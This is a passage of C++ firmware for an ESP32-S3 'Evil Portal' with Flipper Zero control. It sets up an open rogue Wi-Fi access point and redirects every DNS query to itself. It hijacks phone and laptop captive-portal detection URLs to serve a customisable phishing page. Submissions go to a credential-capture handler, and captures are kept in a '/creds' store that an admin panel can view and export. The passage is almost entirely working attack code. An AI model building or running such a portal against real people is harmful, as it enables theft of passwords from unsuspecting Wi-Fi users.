            return;
        }
        
        if (!doc["html"].is<const char*>()) {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"Missing html field\"}");
            return;
        }
        
        String newHtml = doc["html"].as<String>();
        if (changeHtml(newHtml.c_str(), SOURCE_WEB)) {
            request->send(200, "application/json", "{\"success\":true,\"message\":\"HTML applied immediately\"}");
        } else {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"HTML too large or empty\"}");
        }
    }
}

// Handler for POST /api/v1/templates
void handleTemplateSave(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    
    static String body;
    if (index == 0) body = "";
    for (size_t i = 0; i < len; i++) body += (char)data[i];
    
    if (index + len == total) {
        JsonDocument doc;
        if (deserializeJson(doc, body)) {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"Invalid JSON\"}");
            return;
        }
        
        if (!doc["name"].is<const char*>() || !doc["html"].is<const char*>()) {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"Missing name or html field\"}");
            return;
        }
        
        String name = doc["name"].as<String>();
        String html = doc["html"].as<String>();
        
        if (saveTemplate(name.c_str(), html.c_str())) {
            request->send(200, "application/json", "{\"success\":true}");
        } else {
            request->send(500, "application/json", "{\"success\":false,\"error\":\"Failed to save template\"}");
        }
    }
}

// ============================================================================
// ADMIN ROUTES
// ============================================================================

void setupAdminRoutes() {
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) return request->requestAuthentication();
        request->send_P(200, "text/html", admin_dashboard_html);
    });
    
    server.on("/admin/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) return request->requestAuthentication();
        request->send_P(200, "text/html", admin_logs_html);
    });
    
    server.on("/admin/config", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) return request->requestAuthentication();
        request->send_P(200, "text/html", admin_config_html);
    });
    
    server.on("/admin/templates", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) return request->requestAuthentication();
        request->send_P(200, "text/html", admin_templates_html);
    });
    
    server.on("/admin/export", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) return request->requestAuthentication();
        request->send_P(200, "text/html", admin_export_html);
    });
    
    server.on("/admin/logout", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", "<html><body style='background:#0f172a;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'><div style='text-align:center;'><h1>Logged Out</h1><a href='/admin' style='color:#3b82f6;'>Login Again</a></div></body></html>");
    });
}

// ============================================================================
// CAPTIVE PORTAL ROUTES
// ============================================================================

void setupCaptivePortalRoutes() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (hasCustomHtml) {
            request->send_P(200, "text/html", activeHtml);
        } else {
            request->send_P(200, "text/html", portal_html);
        }
        if (isFlipperConnected()) sendToFlipper("client connected");
    });
    
    server.on("/get", HTTP_GET, handleCredentialCapture);
    
    // Captive portal detection endpoints
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *r) { 
        r->send_P(200, "text/html", hasCustomHtml ? activeHtml : portal_html); 
    });
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
    setupLED();
    ledStarting();
    
    DebugSerial.begin(115200);
    delay(1000);
    FlipperSerial.begin(FLIPPER_BAUD);
    delay(100);
    
    DebugSerial.println("\n╔══════════════════════════════════════════════╗");
    DebugSerial.println("║  ESP32-S3 Evil Portal v" FIRMWARE_VERSION "      ║");
    DebugSerial.println("║  Flipper Zero + Standalone Edition           ║");
    DebugSerial.println("║  NEW: Dynamic SSID/HTML from Web!            ║");
    DebugSerial.println("╚══════════════════════════════════════════════╝\n");
    
    initSPIFFS();
    
    // Create templates directory
    if (spiffsAvailable && !SPIFFS.exists("/templates")) {
        File f = SPIFFS.open("/templates/.keep", "w");
        if (f) f.close();
    }
    if (spiffsAvailable && !SPIFFS.exists("/creds")) {
        File f = SPIFFS.open("/creds/.keep", "w");
        if (f) f.close();
    }
    
    DebugSerial.println("[*] Starting WiFi AP...");
    WiFi.disconnect();
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    WiFi.softAP(activeSSID.c_str(), "");
    delay(100);
    
    DebugSerial.print("[+] SSID: "); DebugSerial.println(activeSSID);
    DebugSerial.print("[+] IP:   "); DebugSerial.println(WiFi.softAPIP());
    
    setupCaptivePortalRoutes();
    setupAdminRoutes();
    setupAPIRoutes();
    
    // Dynamic route handlers
    server.on("^\\/api\\/v1\\/logs\\/(\\d+)$", HTTP_DELETE, handleDeleteLog);
    server.on("/api/v1/config", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL, handleConfigUpdate);
    server.on("/api/v1/portal-html", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL, handleHtmlUpdate);
    server.on("/api/v1/templates", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL, handleTemplateSave);
    
    // Template GET by name
    server.on("^\\/api\\/v1\\/templates\\/([a-zA-Z0-9_-]+)$", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        String url = request->url();
        int lastSlash = url.lastIndexOf('/');
        String name = url.substring(lastSlash + 1);
        
        String html = loadTemplate(name.c_str());
        if (html.length() > 0) {
            JsonDocument doc;
            doc["name"] = name;
            doc["html"] = html;
            String response;
            serializeJson(doc, response);
            request->send(200, "application/json", response);
        } else {
            request->send(404, "application/json", "{\"error\":\"Template not found\"}");
        }
    });
    
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    
    DebugSerial.println("\n[+] Web server started");
    DebugSerial.println("[+] DNS server started");
    DebugSerial.println("[+] Flipper UART ready on GPIO 43/44");
    DebugSerial.println("[+] Admin: http://" + apIP.toString() + "/admin");
    DebugSerial.println("\n══════════════════════════════════════════════");
    DebugSerial.println("  Portal READY - Standalone + Flipper modes");
    DebugSerial.println("  v1.3: Dynamic SSID/HTML changes enabled!");
    DebugSerial.println("══════════════════════════════════════════════");
    
    ledReady();
}

// ============================================================================
// MAIN LOOP
// ============================================================================

void loop() {
    // Process Flipper commands
    if (FlipperSerial.available() > 0) {
        String line = FlipperSerial.readStringUntil('\n');
        processFlipperLine(line);
    }
    
    // Process debug commands (for testing)
    if (DebugSerial.available() > 0) {
        String line = DebugSerial.readStringUntil('\n');
        processFlipperLine(line);
    }
    
    // Check Flipper timeout
    if (flipperConnected && !isFlipperConnected()) {
        flipperConnected = false;
        flipperPortalRunning = false;
        DebugSerial.println("[FLIPPER] Connection timeout - back to standalone");
    }
    
    // Process DNS
    dnsServer.processNextRequest();
}
